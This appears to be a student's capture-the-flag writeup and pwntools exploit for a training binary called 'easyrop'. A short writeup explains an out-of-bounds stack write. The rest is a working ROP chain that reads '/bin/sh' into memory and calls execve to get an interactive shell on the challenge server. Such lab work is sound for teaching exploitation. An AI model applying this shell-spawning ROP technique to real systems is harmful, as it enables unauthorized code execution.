
## WRITEUP:
## using checksec ./easyrop reveals that there's no RELRO , no stack canaries and no PIE, only NX
## the first thing I've done was to understand how the each string was actually loaded up into memory
## at every iteration the program took into input two strings "j" and "i" as 4 bytes and later
## summed them up into array[index] where the index was a global variable incremented at each iteration

## The first thing we took notice was that the array size was 12 but the access via the index
## was NOT controlled and could easily go out of bounds in the write as the only thing required for the loop
## to proceed was that the total string length was to be > 2

## so we proceeded to load the usual nop sled to overwrite all the stack and we succeeded as expected
## then it was just a matter of obtaining all the useful gadgets, and at first only two were really needed
## pop_rdi_rsi_rdx_rax_ret and syscall
## to load the content of the registers was trivial given that we had understood how the loading worked BUT
## here comes the problem
## the syscall WON'T WORK , nada, nisba

## I've tried to check everything , was it missing a /x00 , was it too big to be loaded , was the RBP invalid ?
## notes from mr Molina suggested to fix the RBP and so I did with the address of len 0x600370
## and so I loaded up a new rbp before doing the syscall yet nothing changed
## looking at his code became evident that it was necessary to call a read in order to load up the
## bin_sh from a space that was OUTSIDE of the stack, so all that we had to use was the previous address of len
## and by doing that the rop was actually done!


from pwn import *
from getpass import *
import logging
import time
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

if len(sys.argv)==1:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 2015
    c =  remote(site,port)
    process = "./easyrop"

else:
    script_name, debug = sys.argv

    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "rop"
    proc = "easyrop"
    path = "/challenges/"+category+"/"+proc+"/"
    prt = int(input(" insert "+host+"'s port to connect to:"))

    pwd = getpass("insert "+host+"'s password:")

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    process = "."+path+proc

    gdbc = '''
               b *0x4001c0
               c
               b *0x40028b
           '''
    print(sys.argv)
    if ( debug == 'gdb') :
        c = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
    else:
        c = ssh_p.process(process)

zero_section = b"\x00\x00\x00\x00"
## GADGET SECTION
#pop_rdi_rsi_rdx_rax_ret  = p64(0x4001c2)
pop_rdi_rsi_rdx_rax_ret  = b"\xc2\x01\x40\x00" + zero_section + zero_section + zero_section

#syscall  = p64(0x400168)
syscall  = b"\x68\x01\x40\x00"+ zero_section + zero_section + zero_section

#pop_rbp  = p64(0x400170)
pop_rbp  = b"\x70\x01\x40\x00"+ zero_section + zero_section + zero_section

#zero_rax_syscall  = p64(0x400161)
zero_rax_syscall  = b"\x61\x01\x40\x00"+  zero_section + zero_section + zero_section
## DATA SECTION

#null_pointer  = p64( 0x600370+0x7)
null_pointer  = b"\x77\x03\x60\x00" + zero_section + zero_section + zero_section

x3b  = b"\x3b\x00\x00\x00"+  zero_section + zero_section + zero_section

#bin_sh_ptr  = p64(0x600370)
bin_sh_ptr  = b"\x70\x03\x60\x00" + zero_section + zero_section + zero_section
#rbp_base  = p64(0x600370+0x32)
rbp_base  = b"\xa2\x03\x60\x00" + zero_section + zero_section + zero_section

count = b"\xff\x00\x00\x00"  + zero_section + zero_section + zero_section
valid_new_rbp = b"\x40"*16

payload  = (b"\x8f"*4 + b"\x01"*4)*14## buffer
payload += pop_rbp
payload += rbp_base
payload += pop_rdi_rsi_rdx_rax_ret
#rdi
payload += zero_section + zero_section + zero_section + zero_section
#rsi
payload += bin_sh_ptr
#rdx + rax
payload += count
payload += zero_section + zero_section + zero_section + zero_section
#
payload += zero_rax_syscall
payload += valid_new_rbp
payload += pop_rdi_rsi_rdx_rax_ret
#rdi
payload += bin_sh_ptr
#rsi
payload += null_pointer
#rdx
payload += null_pointer
#rax
payload += x3b
payload += syscall

print("Payload length"+str(len(payload)))
c.send(payload)
print("payload sent !")
sleep(0.1)
c.send(b'\n')
sleep(0.1)
c.send(b'\n')
sleep(0.1)
c.send(b'/bin/sh' + b'\x00' * 8)

print("bin/sh sent !")

c.interactive()
